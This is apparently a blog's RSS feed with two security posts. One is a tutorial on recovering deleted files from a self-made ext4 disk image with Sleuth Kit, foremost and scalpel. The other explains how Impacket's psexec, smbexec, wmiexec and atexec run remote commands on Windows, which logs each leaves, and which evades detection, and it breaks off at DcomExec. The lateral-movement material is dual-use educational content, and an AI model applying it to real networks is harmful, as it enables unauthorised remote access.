<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>CTF on Ally Petitt</title>
    <link>http://localhost:1313/ally-petitt/tags/ctf/</link>
    <description>Recent content in CTF on Ally Petitt</description>
    <generator>Hugo -- 0.125.4</generator>
    <language>en-us</language>
    <lastBuildDate>Sat, 13 May 2023 00:00:00 +0000</lastBuildDate>
    <atom:link href="http://localhost:1313/ally-petitt/tags/ctf/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>5 Ways I Found Your Deleted Files</title>
      <link>http://localhost:1313/ally-petitt/posts/2023-05-13_5-ways-i-found-your-deleted-files-492407dbd467/</link>
      <pubDate>Sat, 13 May 2023 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2023-05-13_5-ways-i-found-your-deleted-files-492407dbd467/</guid>
      <description>&lt;h2 id=&#34;computer-forensics-for-filerecovery&#34;&gt;Computer Forensics for File Recovery&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*MnBiAcwiwaFGOOAe.jpg&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://edgy.app/wp-content/uploads/2018/04/dataleakhackerGorodenkoff-970x546.jpg&#34;&gt;https://edgy.app/wp-content/uploads/2018/04/dataleakhackerGorodenkoff-970x546.jpg&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;When a file is “deleted”, its contents aren’t typically erased from the storage device that it was stored on. More often than not, the blocks that stored the file are marked as unallocated and the filesystem pointers are removed from it. The implication is that the file still exists on the disk until it is overwritten.&lt;/p&gt;
&lt;p&gt;There are many methods to recovering the raw, unallocated data. &lt;a href=&#34;https://forensics.wiki/tools_data_recovery/&#34;&gt;This website&lt;/a&gt; lists many tools that can be used for file recovery in different scenarios. In this article, I’ll be walking through 5 different tools that can be used to recover data.&lt;/p&gt;
&lt;h1 id=&#34;setup&#34;&gt;Setup&lt;/h1&gt;
&lt;p&gt;I’ll be using doing forensic analysis on a drive that I created and attached to my Kali Linux VM. To see how this is done, you can reference &lt;a href=&#34;https://opensource.com/article/19/4/create-filesystem-linux-partition&#34;&gt;this article&lt;/a&gt;. On this drive, I saved and then deleted an image file and text file.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*HRHkhSM5bBjI9ouCYNpU4w.png&#34; alt=&#34;Image of commands I used to set up file system for forensic analysis&#34;  /&gt;

I’ll start by doing general enumeration on the disk image. Then, I’ll showcase a variety of file recovery techniques used by forensic analysts that allowed me to recover the deleted files. Many of the tools used will be from the &lt;a href=&#34;http://sleuthkit.org/sleuthkit&#34;&gt;Sleuth Kit&lt;/a&gt; (TSK).&lt;/p&gt;
&lt;p&gt;Before starting, I’ll unmount the filesystem, create a duplicate of it, remove write permissions from the duplicate, and verify the integrity of the duplicate against the original hash of &lt;code&gt;/dev/sdb&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ cd ../ &amp;amp;&amp;amp; umount /mnt/secret # unmount /mnt/secret  
  
$ dd if=/dev/sdb of=/home/kali/forensics/sdb.img # copy /dev/sdb into sdb.img  
22286+0 records in  
22286+0 records out  
11410432 bytes (11 MB, 11 MiB) copied, 0.0412053 s, 277 MB/s  
  
$ chmod a-w /home/kali/forensics/sdb.img # remove write access to the image  
   
$ md5sum /home/kali/forensics/sdb.img /dev/sdb  
6c49fb21916d59e0df69453959392e23 /home/kali/forensics/sdb.img  
6c49fb21916d59e0df69453959392e23 /dev/sdb
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;h2 id=&#34;image-analysis&#34;&gt;Image Analysis&lt;/h2&gt;
&lt;p&gt;Using the &lt;code&gt;file&lt;/code&gt; command reveals that the image uses an ext4 file system.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*4gowWgQfJ4J1FXwjFHjhQg.png&#34; alt=&#34;&#34;  /&gt;

Furthermore, the &lt;code&gt;stat&lt;/code&gt; command displays information about the image such as its size, time stamps, and block details.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*_T8VXPuyfnuQ7Rm5WNIOsQ.png&#34; alt=&#34;output of the stat command&#34;  /&gt;

With the information that the image uses ext4, the &lt;code&gt;fsstat&lt;/code&gt; command can be used to extract more detailed information about the file system, metadata, content data, and block groups.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ fsstat -f ext4 sdb.img   
FILE SYSTEM INFORMATION  
--------------------------------------------  
File System Type: Ext4  
Volume Name:   
Volume ID: dc8a4fb36dce8eabee4c51cf01c2d52a  
  
Last Written at: 2023-05-09 22:35:31 (EDT)  
Last Checked at: 2023-05-09 22:23:26 (EDT)  
  
Last Mounted at: 2023-05-09 22:24:27 (EDT)  
Unmounted properly  
Last mounted on: /mnt/secret  
  
Source OS: Linux  
Dynamic Structure  
Compat Features: Journal, Ext Attributes, Resize Inode, Dir Index  
InCompat Features: Filetype, Extents, 64bit, Flexible Block Groups,   
Read Only Compat Features: Sparse Super, Large File, Huge File, Extra Inode Size  
  
Journal ID: 00  
Journal Inode: 8  
  
METADATA INFORMATION  
--------------------------------------------  
Inode Range: 1 - 2785  
Root Directory: 2  
Free Inodes: 2773  
Inode Size: 256  
  
CONTENT INFORMATION  
--------------------------------------------  
Block Groups Per Flex Group: 16  
Block Range: 0 - 11139  
Block Size: 1024  
Reserved Blocks Before Block Groups: 1  
Free Blocks: 9223  
  
BLOCK GROUP INFORMATION  
--------------------------------------------  
Number of Block Groups: 2  
Inodes per group: 1392  
Blocks per group: 8192  
  
Group: 0:  
 Block Group Flags: [INODE\_ZEROED]   
 Inode Range: 1 - 1392  
 Block Range: 1 - 8192  
 Layout:  
 Super Block: 1 - 1  
 Group Descriptor Table: 2 - 2  
 Group Descriptor Growth Blocks: 3 - 89  
 Data bitmap: 90 - 90  
 Inode bitmap: 92 - 92  
 Inode Table: 94 - 441  
 Uninit Data Bitmaps: 92 - 105  
 Uninit Inode Bitmaps: 94 - 107  
 Uninit Inode Table: 790 - 5661  
 Data Blocks: 5690 - 8192  
 Free Inodes: 1381 (99%)  
 Free Blocks: 6365 (77%)  
 Total Directories: 2  
 Stored Checksum: 0x7DEB  
  
Group: 1:  
 Block Group Flags: [INODE\_UNINIT, INODE\_ZEROED]   
 Inode Range: 1393 - 2784  
 Block Range: 8193 - 11139  
 Layout:  
 Super Block: 8193 - 8193  
 Group Descriptor Table: 8194 - 8194  
 Group Descriptor Growth Blocks: 8195 - 8281  
 Data bitmap: 91 - 91  
 Inode bitmap: 93 - 93  
 Inode Table: 442 - 789  
 Data Blocks: 8282 - 11139  
 Free Inodes: 1392 (100%)  
 Free Blocks: 2858 (96%)  
 Total Directories: 0  
 Stored Checksum: 0xDFA7
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Based on this output, it is clear that the block size is 1024 bits, there are 1113 total blocks, and there are 2785 inodes.&lt;/p&gt;
&lt;p&gt;In addition, &lt;code&gt;parted&lt;/code&gt; can be used to find more information on the partition table, which can be useful when using scalpel.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*EAJIlLWQ5g3rEgqc5nPNbQ.png&#34; alt=&#34;&#34;  /&gt;

Finally, running &lt;code&gt;strings&lt;/code&gt; on the image gives more insight as to what is in the filesystem. It appears that my &lt;code&gt;secret.txt&lt;/code&gt; file with the contents &lt;code&gt;Hello World&lt;/code&gt; is appearing from the &lt;code&gt;strings&lt;/code&gt; command in addition to a failed image download attempt.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*hINgjWeGy7ttVHl1qDs1EQ.png&#34; alt=&#34;&#34;  /&gt;

In the command &lt;code&gt;strings -a --radix=d sdb.img&lt;/code&gt;, &lt;code&gt;-a&lt;/code&gt; is an option to scan the entire file and &lt;code&gt;--radix=d&lt;/code&gt; tells &lt;code&gt;strings&lt;/code&gt; to show the offset that the string was found at in base 10.&lt;/p&gt;
&lt;h2 id=&#34;analyzing-thefiles&#34;&gt;Analyzing the Files&lt;/h2&gt;
&lt;p&gt;This particular image does not have any files currently in it aside from deleted files, so there isn’t much information to gain from mounting it and analyzing the files. In cases where it is desireable to do so, the following command can be used:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ mount -o ro,loop,noexec,noatime sdb.img
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Below, I’ll explain what the options do:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-o&lt;/code&gt;: sets the options for mounting &lt;code&gt;sdb.img&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ro&lt;/strong&gt;: an option to mount the file system as being read-only&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;loop&lt;/strong&gt;: mount the file system on a loop device&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;noexec&lt;/strong&gt;: disallow execution&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;noatime&lt;/strong&gt;: don’t change the access time of the files&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You can then continue to run &lt;code&gt;file&lt;/code&gt; on the files within the mounted loop device and save their md5 hashes to verify integrity.&lt;/p&gt;
&lt;h1 id=&#34;recovering-thefiles&#34;&gt;Recovering the Files&lt;/h1&gt;
&lt;h2 id=&#34;method-1-using-sleuthkithttpsleuthkitorgsleuthkit&#34;&gt;Method 1: Using &lt;a href=&#34;http://sleuthkit.org/sleuthkit/&#34;&gt;Sleuth Kit&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Often, if you have deleted files, they may be displayed with &lt;code&gt;fls sdb.img&lt;/code&gt;, enumerated with &lt;code&gt;istat -o &amp;lt;offset&amp;gt; sdb.img &amp;lt;inode_number&amp;gt;&lt;/code&gt;, and recovered with &lt;code&gt;icat -o &amp;lt;offset&amp;gt; sdb.img &amp;lt;inode_number&amp;gt;&lt;/code&gt;. An example of the latter 2 steps are shown in the screenshot below.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*mc44fgKV8os0qCVpYYZiJQ.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://www.therootuser.com/wp-content/uploads/2017/11/Screenshot-2017-11-07-17.27.58.png&#34;&gt;https://www.therootuser.com/wp-content/uploads/2017/11/Screenshot-2017-11-07-17.27.58.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;This does not appear to be the case for me, however. My deleted files are not appearing from the &lt;code&gt;fls&lt;/code&gt; command. Instead, I see a variable called &lt;code&gt;$OrphanFiles&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*hQXtm0cZ7wge3IgQlexR-Q.png&#34; alt=&#34;&#34;  /&gt;

&lt;code&gt;$OrphanFiles&lt;/code&gt; are files that still exist in the image, but are no longer able to be accessed from the root directory. &lt;code&gt;$OrphanFiles&lt;/code&gt; is not an actual directory on the image, it is Sleuth Kit’s virtual way to demonstrate that the file metadata still exists (&lt;a href=&#34;https://wiki.sleuthkit.org/index.php?title=Orphan_Files&#34;&gt;read more&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;To recover these orphan files, I will attempt a few techniques starting with &lt;code&gt;extundelete&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;method-2-extundeletehttpsextundeletesourceforgenet&#34;&gt;Method 2: &lt;a href=&#34;https://extundelete.sourceforge.net/&#34;&gt;Extundelete&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;This tool can be used to recover files on ext3 and ext4 filesystems. I was having some difficulties with the build from &lt;code&gt;apt&lt;/code&gt;, so I build the program from source with the following commands to it working again:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;apt update &amp;amp;&amp;amp; apt install -y libext2fs-dev   
git clone https://github.com/cherojeong/extundelete.git  
./configure  
make  
src/extundelete --restore-all /path/to/image.img
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;os &amp;lt;&amp;lt; “Directory ACL: “ &amp;lt;&amp;lt; inode.i_dir_acl &amp;lt;&amp;lt; std::endl;&lt;/code&gt; with &lt;code&gt;os &amp;lt;&amp;lt; “Directory ACL: “ &amp;lt;&amp;lt; inode.i_file_acl &amp;lt;&amp;lt; std::endl;&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The command &lt;code&gt;extundelete --restore-all sdb.img&lt;/code&gt; can be used to recover files.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Ipv-ABMSCpXNtc6PZT5zqQ.png&#34; alt=&#34;&#34;  /&gt;

As you can see in the screenshot above, the tool was unsuccessful in recovering the orphan files. This is still a viable option that can work in many scenarios which is why I decided to include it in this article.&lt;/p&gt;
&lt;p&gt;I’m not giving up yet. We’ll try again!&lt;/p&gt;
&lt;h2 id=&#34;method-3testdiskhttpswwwcgsecurityorgwikitestdisk&#34;&gt;Method 3: &lt;a href=&#34;https://www.cgsecurity.org/wiki/TestDisk&#34;&gt;TestDisk&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;The &lt;code&gt;.tar.bz&lt;/code&gt; file can be downloaded &lt;a href=&#34;https://www.cgsecurity.org/wiki/TestDisk_Download&#34;&gt;here&lt;/a&gt;. I’m using version 7.2. Note that in order for &lt;code&gt;TestDisk&lt;/code&gt; to work, you must run it in the download directory. Otherwise you might get an error like &lt;code&gt;*** Error in &lt;/code&gt;/path/to/testdisk-7.2-WIP/photorec_static&amp;rsquo;: malloc(): memory corruption: 0x0000000002617d29 ***`.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# extract and run the file  
tar -xf testdisk-7.2-WIP.linux26-x86\_64.tar.bz2  
cd testdisk-7.2-WIP  
./photorec\_static /path/to/sdb.img /log 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A help menu will appear. I’ll first select the image that I want to work with.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*vEuqI7RnAWsvLfrH9n88Pw.png&#34; alt=&#34;&#34;  /&gt;

Then, I select the option for the partition table for the media. Mine does not have one, so I choose “None”. I verified that this was the only option that was able to list files for me.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*c5iJeI2oyLMdmRu_bBD5Qg.png&#34; alt=&#34;&#34;  /&gt;

After this, I navigate to the “List” option at the bottom of the terminal and press &lt;code&gt;Enter&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*jl17is949wOoNF0JEzBcIg.png&#34; alt=&#34;&#34;  /&gt;

This leads me to the listing of the files on the image with the successfully recovered ones in &lt;strong&gt;red&lt;/strong&gt; text.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*yYQEslxR1RWkUbkEX743Bg.png&#34; alt=&#34;&#34;  /&gt;

As you can see in the screenshot, there are no new files there listed in red. This means that &lt;code&gt;TestDisk&lt;/code&gt; was unsuccessful in recovering the deleted files.&lt;/p&gt;
&lt;p&gt;It’s okay, I still got a few more tricks up my sleeve.&lt;/p&gt;
&lt;h2 id=&#34;method-4foremosthttpssourceforgenetprojectsforemost&#34;&gt;Method 4: &lt;a href=&#34;https://sourceforge.net/projects/foremost/&#34;&gt;Foremost&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Foremost can be installed with &lt;code&gt;apt&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo apt install foremost
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This tool uses a technique known as &lt;strong&gt;file carving&lt;/strong&gt; which involves searching through the raw data on a disk and carving out the values between the header and/or footer of the file.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*ayacIY6WQdxAYksd_nwT8g.png&#34; alt=&#34;&#34;  /&gt;

Alas, we were able to recover a deleted image file from the drive with &lt;code&gt;foremost -t jpeg -o recovered-files -i sdb.img&lt;/code&gt;. The recovered image renders as expected in the Image Viewer. What a pretty camp fire.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*kA2aubO7prDBFW9Xx0cGvQ.png&#34; alt=&#34;&#34;  /&gt;

The fact that this worked while the previous 3 methods did not further demonstrates that different tools and techniques will be more effective at data recovery in different scenarios.&lt;/p&gt;
&lt;p&gt;It’s also worth mentioning that you can edit the &lt;code&gt;/etc/foremost.conf&lt;/code&gt; file to contain your own custom headers and footers for the file you are looking for. Modifying these values will be explored in the next and final method.&lt;/p&gt;
&lt;h2 id=&#34;method-5scalpelhttpsgithubcomsleuthkitscalpel&#34;&gt;Method 5: &lt;a href=&#34;https://github.com/sleuthkit/scalpel&#34;&gt;Scalpel&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Scalpel is much like Foremost with added flexibility. You are not as limited on the file types and headers, although there is a way to modify foremost to have the same customization that scalpel provides.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo apt install scalpel  
cp /etc/scalpel/scalpel.conf .  
vim scalpel.conf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I’ll edit the config with the bit of background information that I have. I know that I’m attempting to recover a JPEG file and I also know that there was a text file that began with the word “Hello”. By using &lt;code&gt;xxd&lt;/code&gt;, I can determine the file headers for a &lt;code&gt;.txt&lt;/code&gt; file starting with the word “Hello”. In this case, it would be &lt;code&gt;\x48\x65\x6c\x6c\x6f&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ echo -n Hello | xxd   
00000000: 4865 6c6c 6f Hello.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We will use this information to update the &lt;code&gt;scalpel.conf&lt;/code&gt; file in &lt;code&gt;vim&lt;/code&gt;. As explained in the comments at the top of the config file, the first column indicates the file extension. The second is whether the header and footer are case sensitive, the third is the header in hexadecimal bytes, the fourth column is an optional footer, and the fifth column is an optional parameter to search backwards from the header rather than just forward.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Y6kTU1JxILxivTOYbHN5tQ.png&#34; alt=&#34;&#34;  /&gt;

With these options set, &lt;code&gt;scalpel&lt;/code&gt; can now be ran to extract these files from the drive.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;scalpel -o recovered-files\_scalpel -c scalpel.conf sdb.img
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*O3huS4-S2BausvT-s2KiYw.png&#34; alt=&#34;&#34;  /&gt;

It appears that the text file was successfully recovered.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*jASCyrkTBYVfhWQxZkk3lg.png&#34; alt=&#34;&#34;  /&gt;

The image was recovered as well.&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*5ixUUenRR50lIavpZ0oyIw.png&#34; alt=&#34;&#34;  /&gt;

Conclusion&lt;/h1&gt;
&lt;p&gt;There’s many ways to achieve the same outcome. The different tools showcased here have their specific applications where they perform best. Even though not all the methods outlined here worked for my particular situation, that doesn’t mean they won’t work for you. There are many factors that determine whether file recovery will be successful including the partitioning table type, how long it has been since they were deleted, the size of the file (smaller files are more likely to be recovered), the health of the storage device, and the operations that have been done on the drive since deleting the files such as reformatting the drive.&lt;/p&gt;
&lt;p&gt;I hope that through reading this article, you were able to deepen your understanding of file recovery and gain practical knowledge that you can apply in the real world. Thanks for reading and I’ll see you next time.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Windows Remoting: Difference between psexec, wmiexec, atexec, *exec</title>
      <link>http://localhost:1313/ally-petitt/posts/2022-12-09_windows-remoting--difference-between-psexec--wmiexec--atexec---exec-bf7d1edb5986/</link>
      <pubDate>Fri, 09 Dec 2022 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2022-12-09_windows-remoting--difference-between-psexec--wmiexec--atexec---exec-bf7d1edb5986/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*2pekupqLLWtBkgpl&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://images.pexels.com/photos/3760778/pexels-photo-3760778.jpeg?auto=compress&amp;amp;amp;cs=tinysrgb&amp;amp;amp;w=1260&amp;amp;amp;h=750&amp;amp;amp;dpr=1&#34;&gt;https://images.pexels.com/photos/3760778/pexels-photo-3760778.jpeg?auto=compress&amp;amp;amp;cs=tinysrgb&amp;amp;amp;w=1260&amp;amp;amp;h=750&amp;amp;amp;dpr=1&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;If you’re anything like me, you discovered &lt;a href=&#34;https://github.com/SecureAuthCorp/impacket&#34;&gt;Impacket&lt;/a&gt;, either through a course, Ippsec, or your own research, and you look at the scripts. Your grin turns into horror as you realize the sheer amount of scripts that end with “exec”. They all give you remote access but when do you use which one!? Don’t worry, I have your back. Let’s break them down.&lt;/p&gt;
&lt;h1 id=&#34;psexec&#34;&gt;PsExec&lt;/h1&gt;
&lt;p&gt;PsExec works by writing a randomly-named binary to the &lt;code&gt;ADMIN$&lt;/code&gt; SMB share (hence why you require write access to that share in order to use it). The binary establishes a named pipe that is used by the SVCManager to create a new service. This named pipe can be used by the user to execute commands remotely. You can imagine the binary as executing the following command:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sc create [serviceName] binPath= &amp;#34;C:\Windows\[uploaded-binary].exe&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;All of your command input and output occurs over the named pipe via SMB (445/TCP).&lt;/p&gt;
&lt;p&gt;As pointed out by &lt;a href=&#34;https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/&#34;&gt;Jeremy Dupuis&lt;/a&gt;, PsExec leaves artifacts behind that require manual cleaning as the binary that is uploaded is not automatically removed. In fact, this is what the error logs look like after he ran a single command on PsExec before exiting.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*Pj8MeQykWNNX4Kr_.png&#34; alt=&#34;Picture of an error log from this article: https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sys.png&#34;&gt;https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sys.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*8jYiFbXMIpkEf-r1.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sec.png&#34;&gt;https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sec.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;As you can see, the logs showed:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1 System Event IDs: 7045 (Service Started)&lt;/li&gt;
&lt;li&gt;12 Security Event IDs: 4672 (Special Privilege Logon), 4624 (Logon), 4634 (Logoff)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;smbexec--the-next-logicalstep&#34;&gt;SmbExec- the next logical step&lt;/h1&gt;
&lt;p&gt;SmbExec works similarly to PsExec. The main difference is that PsExec will upload a &lt;code&gt;.exe&lt;/code&gt; file to the &lt;code&gt;ADMIN$&lt;/code&gt; share while SmbExec uploads a &lt;code&gt;.bin&lt;/code&gt; file along with a temporary file.&lt;/p&gt;
&lt;p&gt;If you’re interested in learning how to replicate this manually, &lt;a href=&#34;https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec#manual-smbexec&#34;&gt;HackTricks&lt;/a&gt; has a section demonstrating how to do so.&lt;/p&gt;
&lt;p&gt;Referencing the images from &lt;a href=&#34;https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/&#34;&gt;Jeremy Dupuis&lt;/a&gt;, we can see the log output for establishing a connection via SmbExec, executing one command, and exiting.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*-KV26ONRuN8dlFWy.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs.png&#34;&gt;https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*MsVaNUTQpbyjLkci.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs-sec.png&#34;&gt;https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs-sec.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The resulting logs are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;4 System Event IDs: 7045 (Service Started), 7009 (Service Error — Timeout)&lt;/li&gt;
&lt;li&gt;3 Security Event IDs: 4672 (Special Privilege Logon), 4624 (Logon), 4634 (Logoff)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;wmiexec-psexec&#34;&gt;Wmiexec &amp;gt; Psexec?&lt;/h1&gt;
&lt;p&gt;WMIexec works via Windows Management Instrumentation (WMI). WMI works by negotiating a random port (&amp;gt;1024) with the client over an initial connection to RCP (135/TCP). WMI and RPC are commonly used for network administration, so it is common for the ports to be open and unfiltered on an internal network.&lt;/p&gt;
&lt;p&gt;The user sends input to the remote host over the random port. The input is executed with &lt;code&gt;cmd.exe&lt;/code&gt; and the output is written to a file in the &lt;code&gt;ADMIN$&lt;/code&gt; SMB share. The filename starts with &lt;code&gt;__&lt;/code&gt;, followed by the timestamp.&lt;/p&gt;
&lt;p&gt;The advantage to this method is that it allows us to execute code without writing on the disk or creating a new system. The result is a lowered chance of detection by Windows Security Essentials and Bit9, for instance.&lt;/p&gt;
&lt;p&gt;In addition, you can utilize WMI for remote access via the program &lt;code&gt;pth-wmis&lt;/code&gt; which comes preinstalled with Kali Linux.&lt;/p&gt;
&lt;p&gt;Again, we can view the log output of a connection, executing a single command, and exiting as demonstrated by &lt;a href=&#34;https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/&#34;&gt;Jeremy Dupuis&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*TzXqdM8qKIHbTsMN.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://jb05s.github.io/images/attacking-windows-impacket/wmiexec-eventlogs.png&#34;&gt;https://jb05s.github.io/images/attacking-windows-impacket/wmiexec-eventlogs.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The result is:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;14 Security Event IDs: 4672 (Special Privilege Logon), 4624 (Logon), 4634 (Logoff)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If you’re interested in learning more about WmiExec, &lt;a href=&#34;https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/&#34;&gt;this article&lt;/a&gt; goes into detail about how it works on a low level and how it is detected.&lt;/p&gt;
&lt;h1 id=&#34;atexec&#34;&gt;AtExec&lt;/h1&gt;
&lt;p&gt;This program works by remotely executing scheduled tasks on a remote target through RCP. It creates a scheduled task via the Task Schedule Service. The task is executed with &lt;code&gt;cmd.exe&lt;/code&gt; and the output of the command (&lt;code&gt;STDERR&lt;/code&gt;and &lt;code&gt;STDERR&lt;/code&gt;) is written in a temporary file in the &lt;code&gt;ADMIN$&lt;/code&gt; SMB share. AtExec retrieves the value of this file before deleting it.&lt;/p&gt;
&lt;h1 id=&#34;dcomexec&#34;&gt;DcomExec&lt;/h1&gt;
